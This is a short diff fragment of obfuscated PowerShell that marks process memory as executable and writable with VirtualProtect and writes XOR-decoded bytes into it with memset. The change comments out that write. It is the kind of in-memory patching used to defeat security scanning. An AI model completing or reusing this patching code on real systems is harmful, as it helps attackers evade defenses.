@@ -67,7 +67,7 @@ for ($i=0;$i -le ($awpqwdlg.Length-1);$i++) {
     $cc=$hvjZWYbx::VirtualProtect([IntPtr]($gCCHzAVl.toInt64()+$YBWmScdj+$i), [UInt32]1, [UInt32]0x40, [ref][UInt32]0)
 
     $sh = $awpqwdlg[$i] -bxor 0x0
-    $c = $hvjZWYbx::memset([IntPtr]($gCCHzAVl.ToInt64()+$YBWmScdj+$i), $sh , 1)
+    #$c = $hvjZWYbx::memset([IntPtr]($gCCHzAVl.ToInt64()+$YBWmScdj+$i), $sh , 1)
 
 }
 
